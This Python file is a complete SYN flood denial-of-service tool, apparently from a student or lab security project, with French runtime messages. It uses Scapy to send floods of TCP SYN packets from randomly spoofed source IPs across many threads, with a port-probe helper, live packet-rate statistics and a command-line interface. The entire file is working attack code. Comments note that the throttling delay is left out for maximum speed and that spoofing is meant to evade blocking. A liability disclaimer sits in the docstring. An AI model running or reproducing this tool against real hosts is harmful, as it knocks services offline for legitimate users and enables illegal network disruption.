"""
SYN Flooding Module - Denial of Service (DoS) Attack

This module implements a TCP SYN flood attack, a classic Denial-of-Service (DoS) attack.

HOW SYN FLOOD WORKS:
1. Client normally sends SYN packet to server to initiate TCP connection
2. Server responds with SYN-ACK and waits for ACK from client
3. Server stores half-open connection in a queue with limited size
4. This attack sends thousands of SYN packets with spoofed source IPs
5. Server's connection queue fills up with half-open connections
6. Server cannot accept new legitimate connections
7. Result: Service becomes unavailable to legitimate users

ATTACK COMPONENTS:
- Multiple threads: Each thread sends packets continuously
- Spoofed source IPs: Random source IPs to avoid blocking
- No ACK response: Attack never completes the handshake
- Statistics: Track packets/sec, total packets sent, duration

IMPACT:
- Server memory exhausted by half-open connections
- CPU usage increases due to connection processing
- Legitimate users cannot connect to the service
- Attack can last from seconds to days depending on defenses

DEFENSE MECHANISMS (SYN cookies, rate limiting, etc.) detected by IDS

SECURITY WARNING:
- This is an ILLEGAL network attack in most jurisdictions
- Use ONLY in authorized lab/test environments
- Creates significant network disruption
- Author assumes NO liability for misuse

Dependencies: Scapy for packet crafting, threading for parallelization
"""

import os                                       # OS operations (privilege check)
import sys                                      # System utilities and path
import time                                     # Timing and delays
import random                                   # Random number generation
import argparse                                 # Command-line arguments
import threading                                # Multi-threaded attack
from datetime import datetime                   # Timestamps for statistics
from pathlib import Path                        # Path operations
from scapy.all import IP, TCP, send, sr1       # Packet crafting and sending

# Add project root to path for imports
sys.path.append(str(Path(__file__).parent.parent))

# Import custom utilities
from utils.logger import get_logger             # Logging functionality
from utils.network_utils import is_valid_ip    # IP address validation


class SYNFlooder:
    """
    TCP SYN Flooding Attack Implementation
    
    This class performs a Denial-of-Service attack by flooding a target
    with TCP SYN packets from spoofed source IPs.
    
    Attributes:
        target_ip (str): IP address of the target server
        target_port (int): Port number to attack (1-65535)
        num_threads (int): Number of worker threads for parallelization
        packets_sent (int): Counter for packets sent
        is_running (bool): Attack state flag
        start_time (datetime): When the attack started
        lock (threading.Lock): Thread-safe lock for counters
    """
    
    def __init__(self, target_ip, target_port, num_threads=10):
        """
        Initialize the SYN Flooder with target information
        
        Args:
            target_ip (str): IP address of the target server
            target_port (int): Port to attack
            num_threads (int): Number of parallel threads (default: 10)
        """
        # Store target information
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        
        # Get logger instance for this module
        self.logger = get_logger("SYNFlood")
        
        # Initialize attack state variables
        self.packets_sent = 0                   # Counter for statistics
        self.is_running = False                 # Attack state flag
        self.start_time = None                  # Timestamp when attack starts
        self.lock = threading.Lock()            # Thread-safe lock for counter updates
        
        # Log initialization details
        self.logger.info(f"🎯 Initialisation du SYN Flooder")
        self.logger.info(f"  Cible: {target_ip}:{target_port}")
        self.logger.info(f"  Threads: {num_threads}")
    
    def _validate_target(self):
        """
        Validate the target IP and port before attacking
        
        Checks:
        - IP address is in valid format
        - Port is in valid range (1-65535)
        
        Returns:
            bool: True if valid, False otherwise
        """
        # Validate IP address format
        if not is_valid_ip(self.target_ip):
            self.logger.error(f"❌ IP invalide: {self.target_ip}")
            return False
        
        # Validate port number range
        if not (1 <= self.target_port <= 65535):
            self.logger.error(f"❌ Port invalide: {self.target_port}")
            return False
        
        # All validations passed
        self.logger.info("✅ Cible validée")
        return True
    
    def _generate_random_ip(self):
        """
        Generate a random source IP address for packet spoofing
        
        Spoofing source IPs helps avoid simple IP-based rate limiting
        that might block our attack machine's IP address.
        
        Returns:
            str: Random IP address in format XXX.XXX.XXX.XXX
        """
        # Generate each octet as random number from 1-254
        # (0 and 255 are reserved)
        return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
    def _send_syn_packet(self):
        """
        Send a single TCP SYN packet with spoofed source IP
        
        This method:
        1. Generates a random source IP to spoof
        2. Generates random source port (1024-65535)
        3. Creates TCP SYN packet (flags="S")
        4. Sends packet to target
        5. Updates packet counter in thread-safe manner
        """
        try:
            # Generate random source IP (spoofed)
            src_ip = self._generate_random_ip()
            # Generate random source port (ephemeral port range)
            src_port = random.randint(1024, 65535)
            
            # Create IP layer of packet (source -> target)
            ip_layer = IP(src=src_ip, dst=self.target_ip)
            # Create TCP layer with SYN flag set
            # flags="S" means SYN packet (start of TCP connection)
            tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="S")
            
            # Combine layers: IP/TCP creates a complete packet
            packet = ip_layer / tcp_layer
            # Send packet without verbose output
            send(packet, verbose=False)
            
            # Increment packet counter in thread-safe manner
            # Multiple threads might update counter simultaneously
            with self.lock:
                self.packets_sent += 1
        
        except Exception as e:
            # Log any errors that occur during packet sending
            self.logger.error(f"❌ Erreur lors de l'envoi: {e}")
    
    def _worker_thread(self, thread_id):
        """
        Worker function executed by each attack thread
        
        Each thread continuously sends SYN packets until is_running is False.
        Threads run independently and in parallel.
        
        Args:
            thread_id (int): Unique identifier for this thread (for logging)
        """
        # Log thread startup
        self.logger.debug(f"Thread {thread_id} démarré")
        
        # Main loop: send packets while attack is running
        while self.is_running:
            # Send one SYN packet
            self._send_syn_packet()
            # Optional: Small delay to prevent CPU overload
            # Commented out for maximum attack speed
            # time.sleep(0.001)  # Uncomment for 1ms delay between packets
        
        # Log thread shutdown
        self.logger.debug(f"Thread {thread_id} arrêté")
    
    def start_attack(self, duration=None):
        """
        Start the SYN flood attack
        
        This method:
        1. Validates the target
        2. Creates and starts worker threads
        3. Displays real-time statistics
        4. Handles keyboard interrupt (Ctrl+C)
        5. Stops and logs final statistics
        
        Args:
            duration (int): Attack duration in seconds (None = unlimited)
        """
        # Validate target before attacking
        if not self._validate_target():
            return
        
        # Set attack state flags
        self.is_running = True
        self.start_time = datetime.now()
        self.packets_sent = 0
        
        # Log attack start
        self.logger.attack_started("SYN_FLOOD", f"{self.target_ip}:{self.target_port}")
        # Display status to user
        print(f"\n⚡ Attaque SYN Flood lancée contre {self.target_ip}:{self.target_port}")
        print(f"   Threads actifs: {self.num_threads}")
        print("   Appuyez sur Ctrl+C pour arrêter\n")
        
        # ============ CREATE AND START WORKER THREADS ============
        threads = []
        for i in range(self.num_threads):
            # Create thread that will run _worker_thread
            thread = threading.Thread(target=self._worker_thread, args=(i,))
            # Mark as daemon so thread stops when main program exits
            thread.daemon = True
            # Start the thread
            thread.start()
            # Store reference for later management
            threads.append(thread)
        
        try:
            # ============ DISPLAY REAL-TIME STATISTICS ============
            last_count = 0                      # Packets from previous second
            last_time = time.time()             # Time of previous check
            
            while self.is_running:
                # Sleep 1 second before checking stats
                time.sleep(1)
                
                # -------- Calculate packet rate --------
                current_time = time.time()
                current_count = self.packets_sent
                elapsed = current_time - last_time
                
                if elapsed > 0:
                    # Calculate packets per second
                    rate = (current_count - last_count) / elapsed
                    
                    # Calculate total elapsed time
                    total_elapsed = (datetime.now() - self.start_time).total_seconds()
                    
                    # Display stats on same line (using \r to return to start)
                    print(f"\r📤 Paquets SYN envoyés: {current_count:,} | "
                          f"Taux: {rate:.0f} pkt/s | "
                          f"Temps: {total_elapsed:.0f}s", 
                          end="", flush=True)
                
                # Update counters for next iteration
                last_count = current_count
                last_time = current_time
                
                # -------- Check if duration limit reached --------
                if duration and (datetime.now() - self.start_time).total_seconds() >= duration:
                    print("\n\n⏱️  Durée atteinte, arrêt de l'attaque...")
                    break
        
        except KeyboardInterrupt:
            # Handle user pressing Ctrl+C
            print("\n\n🛑 Interruption détectée...")
        
        finally:
            # Always clean up when attack stops
            self.stop_attack()
            
            # Wait for all threads to finish (with 2-second timeout)
            for thread in threads:
                thread.join(timeout=2)
    
    def stop_attack(self):
        """
        Stop the attack and display final statistics
        
        This method:
        1. Sets is_running to False to stop worker threads
        2. Calculates and displays statistics
        3. Logs final attack summary
        """
        # Check if attack is even running
        if not self.is_running:
            return
        
        # Signal all worker threads to stop
        self.is_running = False
        
        # Display stop message
        print("\n⏹️  Arrêt de l'attaque...")
        
        # ============ CALCULATE AND DISPLAY STATISTICS ============
        if self.start_time:
            # Calculate total attack duration
            duration = (datetime.now() - self.start_time).total_seconds()
            # Calculate average packets per second
            avg_rate = self.packets_sent / duration if duration > 0 else 0
            
            # Create statistics dictionary
            stats = {
                "Durée": f"{duration:.2f} secondes",
                "Paquets envoyés": f"{self.packets_sent:,}",
                "Taux moyen": f"{avg_rate:.0f} paquets/s",
                "Threads utilisés": self.num_threads
            }
            
            # Log final attack statistics
            self.logger.attack_stopped("SYN_FLOOD", stats)
            
            # Display statistics to console
            print("\n📊 Statistiques finales:")
            for key, value in stats.items():
                print(f"   {key}: {value}")
    
    def test_target_port(self):
        """
        Test if the target port is open before attacking
        
        This helper method:
        1. Sends a single SYN packet to the target
        2. Waits for response
        3. Determines if port is open (SYN-ACK) or closed (RST)
        4. Properly closes the connection with RST
        
        Returns:
            bool: True if port is open, False if closed/no response
        """
        # Log port test start
        self.logger.info(f"🔍 Test du port {self.target_port} sur {self.target_ip}...")
        
        try:
            # Create IP layer pointing to target
            ip_layer = IP(dst=self.target_ip)
            # Create TCP SYN packet to target port
            tcp_layer = TCP(dport=self.target_port, flags="S")
            
            # Send packet and wait up to 2 seconds for response
            response = sr1(ip_layer/tcp_layer, timeout=2, verbose=False)
            
            if response:
                # Check if response has TCP layer
                if response.haslayer(TCP):
                    flags = response[TCP].flags
                    
                    # Check for SYN-ACK (0x12 = bits 4+1 set)
                    # Port is OPEN
                    if flags == 0x12:  # SYN-ACK
                        self.logger.info(f"✅ Port {self.target_port} OUVERT")
                        
                        # Send RST to properly close the connection
                        rst = IP(dst=self.target_ip)/TCP(dport=self.target_port, flags="R")
                        send(rst, verbose=False)
                        
                        return True
                    
                    # Check for RST-ACK (0x14 = bits 4+2 set)
                    # Port is CLOSED
                    elif flags == 0x14:  # RST-ACK
                        self.logger.info(f"❌ Port {self.target_port} FERMÉ")
                        return False
            
            # No response received
            self.logger.info(f"⚠️  Aucune réponse du port {self.target_port}")
            return False
        
        except Exception as e:
            # Log any errors during port test
            self.logger.error(f"❌ Erreur lors du test: {e}")
            return False


def main():
    """Point d'entrée principal du module"""
    parser = argparse.ArgumentParser(
        description="💥 SYN Flooding - Attaque DoS",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples d'utilisation:
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80 --threads 20
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80 --duration 60
  sudo python3 syn_flood.py -t 192.168.1.100 -p 80 --test

⚠️  ATTENTION: Utilisez uniquement dans un environnement contrôlé!
Cette attaque peut rendre un serveur inaccessible.
        """
    )
    
    parser.add_argument('-t', '--target', required=True,
                       help='IP de la cible')
    parser.add_argument('-p', '--port', type=int, required=True,
                       help='Port de la cible')
    parser.add_argument('--threads', type=int, default=10,
                       help='Nombre de threads (défaut: 10)')
    parser.add_argument('--duration', type=int, default=None,
                       help='Durée de l\'attaque en secondes (défaut: infini)')
    parser.add_argument('--test', action='store_true',
                       help='Tester le port avant l\'attaque')
    
    args = parser.parse_args()
    
    # Vérifier les permissions root
    if os.geteuid() != 0:
        print("❌ Ce script nécessite les privilèges root (sudo)")
        sys.exit(1)
    
    # Créer le flooder
    flooder = SYNFlooder(args.target, args.port, args.threads)
    
    # Tester le port si demandé
    if args.test:
        flooder.test_target_port()
        print("\n⏸️  Appuyez sur Entrée pour continuer l'attaque ou Ctrl+C pour quitter...")
        try:
            input()
        except KeyboardInterrupt:
            print("\n👋 Au revoir!")
            sys.exit(0)
    
    # Lancer l'attaque
    flooder.start_attack(duration=args.duration)


if __name__ == "__main__":
    main()
